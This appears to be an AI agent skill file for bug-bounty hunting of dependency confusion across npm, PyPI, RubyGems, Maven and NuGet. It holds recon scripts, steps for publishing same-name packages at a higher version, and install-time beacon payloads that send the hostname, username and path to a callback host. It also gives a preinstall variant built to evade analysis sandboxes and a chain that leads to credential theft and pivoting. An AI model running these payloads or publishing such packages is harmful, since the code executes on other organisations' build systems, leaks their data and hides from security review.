---
name: hunt-dependency-confusion
description: "Use this skill when you see package.json, requirements.txt, Gemfile, pom.xml, .csproj, go.mod exposed on web roots or in JS bundles. Load when target uses npm/PyPI/RubyGems/Maven/NuGet. Load when you find internal package names in GitHub repos, CI/CD configs, Docker images, or JS bundles. Load when target has private registry (Artifactory, Nexus, CodeArtifact). Bounties range $1k–$150k. Only invoke if real impact potential exists — must receive callback to confirm exploitation."
type: hunt
---

# Hunt: Dependency Confusion (Supply Chain Substitution Attack)

## Crown Jewel Targets

The highest-payout scenarios in bug bounty. Alex Birsan alone earned $130,000+ from 35 companies in one research cycle:

| Company | Payout | Package Manager | Discovery Method |
|---------|--------|-----------------|------------------|
| Microsoft | $40,000 | npm/NuGet | Azure Artifactory internal packages (CVE-2021-24105) |
| Apple | $30,000 | npm | Internal package names found in JS bundle files |
| Shopify | $30,000 | RubyGems | `shopify-cloud` gem found in GitHub, auto-installed in hours |
| PayPal | $30,000 | npm | Internal package names leaked on GitHub repos |
| Yelp | $15,000 | npm | Internal packages found in JS bundles |
| Netflix | RCE confirmed | npm | Forgotten logging helper package — 4-day detection window |
| Tesla | Confirmed | npm | Internal packages in public repos |
| Uber | Confirmed | npm | Internal packages in public repos |
| Elementor | P1 bounty | npm | GitHub org scan via `depconf` tool |
| Unknown | $2,500 | npm | Unclaimed `@company/internal-package` found via JS recon |

**Key insight:** Most programs that accept supply chain bugs pay at maximum allowed bounty. Netflix, Shopify, PayPal all paid $30k. This is often the easiest Critical/High in bug bounty relative to effort.

---

## How the Attack Works

```
1. Attacker finds internal package name (e.g., "acme-analytics")
2. Package does NOT exist on public registry (npm, PyPI, etc.)
3. Attacker publishes malicious package with SAME NAME + HIGHER VERSION (e.g., 9999.0.0)
4. Victim's CI/CD runs: npm install / pip install / gem install
5. Package manager prefers HIGHEST VERSION → downloads attacker's package
6. Preinstall/postinstall script executes → beacon sent to attacker's server
7. Attacker receives callback → RCE confirmed → report submitted
```

**Why it works:** Package managers resolve "best version" across ALL configured registries. Private registry has `acme-analytics@1.0.0`, public registry has `acme-analytics@9999.0.0` → public wins.

---

## Detection Signals — Finding Internal Package Names

### 🏆 Source 1: JS Bundle Files (HIGHEST ROI — Used by Netflix/Apple researchers)

Modern apps embed dependency names in client-side JavaScript. Use headless browser for dynamic bundles:

```bash
# Method 1: Direct grep on downloaded bundles
curl -s https://target.com/app.js | grep -oE '"(@[a-z0-9-]+/[a-z0-9-]+|[a-z][a-z0-9-]{2,})"' | sort -u

# Method 2: LinkFinder-style extraction
python3 linkfinder.py -i https://target.com -d -o cli | grep -E 'require|import'

# Method 3: depconf tool (automated)
pip install depconf
python3 -m depconf --config depconf_config.yaml --enable-notifications har targets.txt

# Method 4: Jsmon (SaaS tool)
# Navigate to jsmon.sh → scan domain → JS Intelligence → Invalid Node Modules tab
# Shows all npm packages found in JS that don't exist on public registry

# Method 5: Burp Suite JS Miner extension
# Automatically extracts package names from all JS files in scope
```

**Key signal:** Package names that look internal (company-prefixed, not on npmjs.com):
- `acme-internal-utils`
- `company-auth-client`
- `@myorg/private-package`
- `internal-deployment-tool`

---

### 🏆 Source 2: GitHub Organization Repos

```bash
# Clone all org repos and scan
gh repo list TARGET_ORG --limit 1000 --json name -q '.[].name' | \
  xargs -I{} -P 8 gh repo clone TARGET_ORG/{} /tmp/repos/{} -- --depth=1 2>/dev/null

# Find all package manifests
find /tmp/repos/ -name "package.json" -not -path "*/node_modules/*" | \
  xargs -I{} jq -r '.dependencies // {} | keys[]' {} 2>/dev/null | sort -u > /tmp/npm-packages.txt

find /tmp/repos/ -name "requirements.txt" | \
  xargs grep -h "^[a-zA-Z]" | cut -d'=' -f1 | cut -d'>' -f1 | sort -u > /tmp/pypi-packages.txt

find /tmp/repos/ -name "Gemfile" | \
  xargs grep -h "^gem " | awk '{print $2}' | tr -d "'" | tr -d '"' | sort -u > /tmp/gems.txt

# Search CI/CD configs for internal registries
find /tmp/repos/ -name "*.yml" -o -name "*.yaml" | \
  xargs grep -l "artifactory\|nexus\|private.*registry\|internal.*npm\|extra-index-url" 2>/dev/null
```

---

### Source 3: Exposed Package Files on Web Root

```bash
# Nuclei templates (fastest)
nuclei -l targets.txt -t http/exposures/configs/package-json.yaml
nuclei -l targets.txt -t http/exposures/configs/requirements-txt.yaml
nuclei -l targets.txt -t http/exposures/configs/gemfile.yaml

# Manual check
for target in $(cat targets.txt); do
  for path in package.json requirements.txt Gemfile composer.json go.mod .npmrc yarn.lock package-lock.json; do
    code=$(curl -sk -o /tmp/pkg -w "%{http_code}" "https://$target/$path")
    [ "$code" = "200" ] && echo "FOUND: https://$target/$path" && cat /tmp/pkg | head -30
  done
done
```

---

### Source 4: Docker Image Layer Analysis

```bash
# Pull and inspect layers
docker pull target-company/internal-app:latest
docker history target-company/internal-app:latest --no-trunc | grep -E "npm install|pip install|gem install"

# Extract filesystem
docker create --name temp target-company/internal-app:latest
docker export temp | tar -x -C /tmp/docker-extract/
find /tmp/docker-extract/ -name "package.json" | xargs grep -l "dependencies"
```

---

### Source 5: CI/CD Configuration Files

```bash
# GitHub Actions
find . -path "*/.github/workflows/*.yml" | xargs grep -l "npm install\|pip install\|extra-index-url\|private.*registry"

# GitLab CI
grep -r "npm install\|pip install\|extra-index-url" .gitlab-ci.yml

# Jenkinsfile
grep -r "npm install\|pip install" Jenkinsfile*

# Azure DevOps
grep -r "npmAuthenticate\|TwineAuthenticate\|NuGetAuthenticate" azure-pipelines.yml
```

---

### Source 6: Error Messages and Stack Traces

```bash
# Trigger 500 errors on app endpoints
# Stack traces often reveal:
# - Internal package names in import errors
# - Module paths showing private registry URLs
# - Full dependency chains

# Example leak in error:
# "Cannot find module '@acme/internal-auth-client'"
# → Package name discovered: @acme/internal-auth-client
```

---

### Source 7: Other High-Value Sources

```bash
# .npmrc files exposed (reveals private registry config)
curl -s https://target.com/.npmrc
# Look for: registry=https://internal.artifactory.company.com/

# Postman public workspaces
# Search: site:postman.com "company.com" "npm" OR "pypi"

# Job postings mentioning internal tools
# "Experience with @company/internal-library"

# Internet forums and Stack Overflow
# site:stackoverflow.com "company.com" "npm install"

# Accidentally published internal packages
# Search npmjs.com for company name → find unpublished internal packages
npm search companyname | grep -v "^NAME"
```

---

## Attack Techniques by Package Manager

### npm (Node.js)

```bash
# Step 1: Check if package exists
curl -s https://registry.npmjs.org/PACKAGE-NAME | jq '.name' 2>/dev/null || echo "UNCLAIMED"

# Step 2: Check all packages at once
cat /tmp/npm-packages.txt | while read pkg; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
  [ "$code" = "404" ] && echo "UNCLAIMED: $pkg"
done

# Step 3: Create malicious package
mkdir -p /tmp/payload/PACKAGE-NAME && cd /tmp/payload/PACKAGE-NAME

cat > package.json << 'EOF'
{
  "name": "PACKAGE-NAME",
  "version": "9999.0.0",
  "description": "Security research — dependency confusion PoC",
  "main": "index.js",
  "scripts": {
    "preinstall": "curl -s 'https://YOUR-INTERACTSH.oast.fun/?pkg=PACKAGE-NAME&h='$(hostname)'&u='$(whoami)'&d='$(pwd) > /dev/null 2>&1 || true"
  },
  "author": "Security Researcher",
  "license": "MIT"
}
EOF

cat > index.js << 'EOF'
// Security research package — dependency confusion PoC
module.exports = {};
EOF

# Step 4: Publish
npm login
npm publish --access public

# Step 5: Wait for callback (check interactsh or Burp Collaborator)
# Step 6: After confirmed callback → UNPUBLISH IMMEDIATELY
npm unpublish PACKAGE-NAME --force
```

**Sandbox evasion in preinstall script:**
```json
"preinstall": "if [ \"$(pwd | cut -c1-4)\" != \"/tmp\" ]; then curl -s \"https://attacker.oast.fun/?h=$(hostname)&u=$(whoami)\" > /dev/null 2>&1; fi"
```
This skips execution in `/tmp` (used by automated analysis sandboxes).

---

### PyPI (Python)

```bash
# Check if package exists
curl -s https://pypi.org/pypi/PACKAGE-NAME/json | jq '.info.name' 2>/dev/null || echo "UNCLAIMED"

# Create malicious package
mkdir -p /tmp/payload/PACKAGE-NAME
cat > /tmp/payload/PACKAGE-NAME/setup.py << 'EOF'
import subprocess, urllib.request, socket, os
from setuptools import setup

def beacon():
    try:
        h = socket.gethostname()
        u = os.getenv('USER', 'unknown')
        urllib.request.urlopen(f'https://YOUR-INTERACTSH.oast.fun/?pkg=PACKAGE-NAME&h={h}&u={u}', timeout=5)
    except:
        pass

beacon()

setup(
    name='PACKAGE-NAME',
    version='9999.0.0',
    description='Security research — dependency confusion PoC',
)
EOF

cd /tmp/payload/PACKAGE-NAME
python3 setup.py sdist
pip install twine
twine upload dist/*
```

**pip --extra-index-url attack:**
```bash
# If company uses: pip install --extra-index-url https://internal.repo package
# PyPI takes precedence with higher version number
# Publish to PyPI with version 9999.0.0 → auto-wins
```

---

### RubyGems (Ruby)

```bash
# Check if gem exists
curl -s https://rubygems.org/api/v1/gems/GEMNAME.json | jq '.name' || echo "UNCLAIMED"

# Find gem names from Gemfile
cat Gemfile | grep "^gem" | awk '{print $2}' | tr -d "'\"," | while read gem; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://rubygems.org/api/v1/gems/$gem.json")
  [ "$code" = "404" ] && echo "UNCLAIMED GEM: $gem"
done

# Create malicious gem
gem_name="GEMNAME"
mkdir -p /tmp/$gem_name/lib
cat > /tmp/$gem_name/$gem_name.gemspec << EOF
Gem::Specification.new do |s|
  s.name = "$gem_name"
  s.version = "9.9.9"
  s.summary = "Security research"
  s.files = ["lib/$gem_name.rb"]
  s.post_install_message = "Installed"
end
EOF
cat > /tmp/$gem_name/lib/$gem_name.rb << 'EOF'
require 'net/http'
require 'socket'
begin
  Net::HTTP.get(URI("https://YOUR-INTERACTSH.oast.fun/?pkg=GEMNAME&h=#{Socket.gethostname}"))
rescue; end
EOF
cd /tmp/$gem_name && gem build $gem_name.gemspec && gem push $gem_name-9.9.9.gem
```

---

### Maven (Java)

```bash
# Check if artifact exists on Maven Central
curl -s "https://search.maven.org/solrsearch/select?q=g:GROUPID+AND+a:ARTIFACTID&rows=1" | jq '.response.numFound'

# If 0 → unclaimed
# Publish malicious artifact to Maven Central or JFrog Artifactory

# pom.xml malicious plugin
# Add to build.lifecycle → executes on mvn install
```

---

### NuGet (.NET)

```bash
# Check package
curl -s "https://api.nuget.org/v3-flatcontainer/PACKAGE-NAME/index.json" | jq '.versions' || echo "UNCLAIMED"

# CVE-2021-24105: Azure Artifacts Dependency Confusion
# Microsoft paid $40,000 for this

# Create malicious .nupkg
# Add build targets that execute on install
```

---

### Go Modules

```bash
# Go modules use full import paths (github.com/company/pkg)
# Less vulnerable but check for:
# - Abandoned GitHub repos that were forked internally
# - Internal module paths not on pkg.go.dev

# Check
curl -s "https://pkg.go.dev/IMPORT-PATH" | grep "No documentation" && echo "POTENTIALLY UNCLAIMED"
```

---

## Automation Tools

### depconf (Best for JS bundles + GitHub)
```bash
pip install depconf
# Create config
cat > depconf_config.yaml << 'EOF'
github_token: YOUR_TOKEN
interactsh_url: YOUR-INTERACTSH.oast.fun
registries:
  npm: https://registry.npmjs.org
  pypi: https://pypi.org
EOF

# Run continuously on all bug bounty domains
while true; do
  python3 -m depconf --config depconf_config.yaml --enable-notifications har all-domains.txt
  sleep 300
done
```

### confused (Multi-package-manager scanner)
```bash
pip install confused
# Check npm
confused -l package.json
# Check pip
confused -l requirements.txt
# Check gem
confused -l Gemfile
```

### Nuclei Templates
```bash
# Find exposed package files
nuclei -l targets.txt -t http/exposures/configs/ -tags package

# Specific templates
nuclei -l targets.txt -t http/exposures/configs/package-json.yaml
nuclei -l targets.txt -t http/exposures/configs/requirements-txt.yaml
nuclei -l targets.txt -t http/exposures/configs/npmrc.yaml
```

### Manual Bulk Check
```bash
#!/bin/bash
# Check all npm packages for availability
check_npm() {
  pkg=$1
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
  [ "$code" = "404" ] && echo "UNCLAIMED_NPM: $pkg"
}
export -f check_npm
cat npm-packages.txt | xargs -P 20 -I{} bash -c 'check_npm "$@"' _ {}
```

---

## Proof of Concept — Two-Stage Strategy

**Stage 1: Claim the name + publish beacon-only payload**
```bash
# Publish with ONLY telemetry — no destructive code
# Wait for callback from target's CI/CD server
# Callback = confirmed exploitation = valid finding
```

**Stage 2: After callback received → Report immediately**
```bash
# Unpublish the package
npm unpublish PACKAGE-NAME --force
# Report to program with:
# - Package name discovered
# - Where it was found (JS bundle / GitHub / etc.)
# - Callback log showing hostname, user, path
# - Timeline of events
```

**Interactsh setup for callbacks:**
```bash
# Free: interactsh.com
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client -v
# Gives you: abc123.oast.fun
# Use in: curl https://abc123.oast.fun/?h=$(hostname)
```

---

## Advanced Techniques (2025+)

### Scoped Package Bypass
Even `@org/package` scopes can be vulnerable if:
1. The org namespace is not claimed on npmjs.com
2. Attacker claims `@org` organization on npm → can publish `@org/package`
3. Test: check if `@org` organization exists at npmjs.com/org/ORG-NAME

### Dynamic Bundle Analysis (Netflix Technique)
Static scraping misses dynamically loaded JS:
```bash
# Use Playwright to capture ALL network requests
playwright_script = """
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  const jsFiles = [];
  page.on('response', r => {
    if (r.url().endsWith('.js') || r.url().includes('.js?')) jsFiles.push(r.url());
  });
  await page.goto('https://target.com');
  await page.waitForTimeout(5000);
  console.log(jsFiles.join('\n'));
  await browser.close();
})();
"""
# Then analyze each captured JS file for package names
```

### HAR File Analysis
```bash
# Capture HAR from browser DevTools
# depconf can analyze HAR files directly
python3 -m depconf --config config.yaml har session.har

# Reveals ALL JS files loaded including lazy-loaded chunks
```

### CI/CD Pipeline Targeting
```bash
# GitHub Actions with self-hosted runners are highest value
# Self-hosted runners run in production network
# Find repos using self-hosted runners:
gh api search/code --q "runs-on: self-hosted" | jq '.items[].repository.full_name'
```

### Transitive Dependency Confusion
```bash
# Not just direct deps — transitive deps can also be confused
# If internal-package-A depends on internal-package-B
# And internal-package-B is unclaimed → vulnerable
npm pack PACKAGE-NAME --dry-run 2>/dev/null | grep "dependencies"
```

---

## Payload Templates

### Minimal Beacon (npm preinstall)
```json
{
  "scripts": {
    "preinstall": "node -e \"require('https').get('https://YOUR.oast.fun/?h='+require('os').hostname()+'&u='+require('os').userInfo().username)\""
  }
}
```

### Cross-platform Beacon
```json
{
  "scripts": {
    "preinstall": "node -e \"try{var h=require('https');h.get('https://YOUR.oast.fun/?h='+require('os').hostname()+'&u='+(process.env.USER||process.env.USERNAME)+'&d='+process.cwd())}catch(e){}\""
  }
}
```

### Python setup.py Beacon
```python
import setuptools, urllib.request, socket, os, getpass
try:
    urllib.request.urlopen(
        f"https://YOUR.oast.fun/?pkg=PKGNAME&h={socket.gethostname()}&u={getpass.getuser()}&d={os.getcwd()}",
        timeout=5
    )
except: pass
setuptools.setup(name="PKGNAME", version="9999.0.0")
```

### Ruby Gemspec Beacon
```ruby
# In lib/GEMNAME.rb
begin
  require 'net/http'
  require 'socket'
  Net::HTTP.get(URI("https://YOUR.oast.fun/?pkg=GEMNAME&h=#{Socket.gethostname}&u=#{ENV['USER']}"))
rescue; end
```

---

## Severity Assessment

| Scenario | Severity | Typical Bounty |
|----------|----------|----------------|
| Callback from production CI/CD server | Critical | $10k–$50k |
| Callback from developer machine (verified) | High | $5k–$20k |
| Callback from staging/test environment | Medium | $1k–$5k |
| Package name unclaimed but no callback received | Low/Informational | $100–$1k |
| Scoped package (@org) org not claimed | Medium | $500–$5k |

**Do NOT report without a confirmed callback** — unclaimed packages alone are typically triaged as informational.

---

## Chain Potential

```
Dependency Confusion → RCE on CI/CD server
    → Steal AWS/GCP/Azure credentials from environment
    → Steal npm/PyPI tokens from CI environment
    → Access source code repositories
    → Pivot to production infrastructure
    → Supply chain attack on downstream customers

Dependency Confusion → Developer machine RCE
    → Steal SSH keys / API tokens
    → Access internal network via developer's VPN
    → Steal code signing certificates
```

---

## Report Writing Template

```markdown
## Summary
I discovered that [COMPANY] uses an internal npm package named `[PACKAGE-NAME]` 
that is not registered on the public npm registry. By registering a package with 
the same name and a higher version number (9999.0.0) on the public registry, 
I was able to achieve Remote Code Execution on [COMPANY]'s internal infrastructure.

## Impact
- Remote Code Execution on CI/CD pipeline / developer machines
- Potential access to production secrets and credentials
- Supply chain attack vector affecting downstream customers

## Steps to Reproduce
1. The internal package name `[PACKAGE-NAME]` was discovered in [JS bundle / GitHub repo / requirements.txt] at [URL]
2. I verified the package was not registered on npm: `curl https://registry.npmjs.org/[PACKAGE-NAME]` → 404
3. I registered the package at [DATE/TIME] with version 9999.0.0 containing only a telemetry beacon
4. At [DATE/TIME], I received a callback from [HOSTNAME] ([IP]) running as user [USERNAME]
5. I immediately unpublished the package at [DATE/TIME]

## Evidence
- Screenshot of package not existing on npm registry
- Screenshot of package published
- Callback log showing: hostname=[X], user=[X], path=[X], timestamp=[X]
- Screenshot of package unpublished

## Timeline
- [TIME] Package name discovered
- [TIME] Package published to npm
- [TIME] Callback received from [HOSTNAME]
- [TIME] Package unpublished
- [TIME] Report submitted
```

---

## Fallback Chain

1. **Primary:** Scan JS bundles with depconf/Playwright for package names
2. **If no JS bundles:** Scan exposed package files on web root with nuclei
3. **If no exposed files:** Scan GitHub org repos for package manifests
4. **If no GitHub access:** Analyze CI/CD configs, Docker images, error messages
5. **If packages found but all claimed:** Check scoped org namespace ownership on npm
6. **If all claimed:** Try other package managers (npm → PyPI → RubyGems → Maven → NuGet)
7. **If no packages found:** Check transitive dependencies of found packages
8. **Never stop** — new packages get added to codebases constantly, recheck monthly

---

## Known False Positives

- Package exists on public registry with same name → NOT vulnerable
- Package is a well-known public package → NOT vulnerable
- Only staging/test environment callback → lower severity (still report)
- Callback from your own IP/machine → setup error, not actual callback

---

## Tools Summary

| Tool | Purpose | Install |
|------|---------|---------|
| depconf | Full automation — JS + GitHub + HAR | `pip install depconf` |
| confused | Multi-manager scanner | `pip install confused` |
| nuclei | Template-based file discovery | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| interactsh-client | Callback listener | `go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest` |
| JS Miner (Burp) | JS package extraction | Burp App Store |
| Jsmon | SaaS JS analysis | jsmon.sh |
| depfuzzer | Fuzzing scoped packages | github.com/synacktiv |
| trufflehog | Secret + package leak detection | `pip install trufflehog` |

## Real-World HackerOne Disclosed Reports

Top techniques observed in disclosed reports for this vuln class (HackerOne data thin for this class — supplemented with public Alex Birsan write-up, Feb 2021):

| # | Technique | Target | Bounty | Source |
|---|-----------|--------|--------|--------|
| 1 | npm dependency confusion -> RCE on internal build systems (CVE-2021-24105 Azure DevOps) | Microsoft | $40,000 | Birsan disclosure |
| 2 | Internal npm package hijack via public registry shadowing | Apple | $30,000 | Birsan disclosure |
| 3 | Internal package name claim on public PyPI/npm registry | PayPal | $30,000 | Birsan disclosure |
| 4 | Public-registry package preempts internal Shopify scoped name | Shopify | $30,000 | Birsan disclosure |
| 5 | Yelp internal npm package hijack via npmjs public registry | Yelp | $15,000 | Birsan disclosure |
| 6 | Tesla internal package hijack via npm | Tesla | $8,000 | Birsan disclosure |
| 7 | RCE in CI/CD via dependency confusion on app-01.youdrive.club | Mail.ru | N/A | H1 #1104693 |
| 8 | Dependency Confusion in Sifnode via unclaimed npm packages | Sifchain | N/A | H1 #1187816 |
| 9 | Dependency confusion in hyperledger/aries-mobile-agent-react-native | Linux Foundation | N/A | H1 #1763343 |
| 10 | Namespace squatting on Maven/Gradle internal artifacts (Birsan follow-on) | Multiple FAANG | $10,000+ | Birsan disclosure |

**High-confidence patterns (3+ reports):**
- **Public-registry preemption of internal package names** — Microsoft $40k, Apple $30k, PayPal $30k, Shopify $30k, Yelp $15k, Tesla $8k. Extract internal package name from leaked `package.json` / source maps / GitHub commits / JS bundles, register the same name on the public registry (npm/PyPI/RubyGems) with a higher version number, attacker package executes on next `npm install` in target CI/CD.
- **CI/CD post-install RCE** — Microsoft Azure DevOps CVE-2021-24105, Mail.ru youdrive H1 #1104693, Sifchain Sifnode. The `preinstall` / `postinstall` npm lifecycle hook gives instant code execution inside the build environment -> AWS metadata / build secrets / source code exfil via interactsh callback.
- **Scoped-package shadowing** — npm `@company/pkg` scoped names left unclaimed on public registry let attacker register them. Hit in Shopify, Apple, Yelp. Always test scoped names extracted from JS bundles even when the unscoped name is taken.
- **Multi-ecosystem coverage** — same target often vulnerable across npm + PyPI + RubyGems simultaneously. Birsan reproduced on Microsoft, Apple, and Tesla across 2+ ecosystems. Always test every package manager the target uses, not just npm.
- **Source discovery vectors that worked** — public GitHub commits (search `org:target internal-package`), leaked `package.json` / `package-lock.json` / `requirements.txt` / `Gemfile.lock`, JS source maps revealing webpack-bundled scoped names, leaked HAR files from bug-bounty triagers, Docker image layers on Docker Hub.

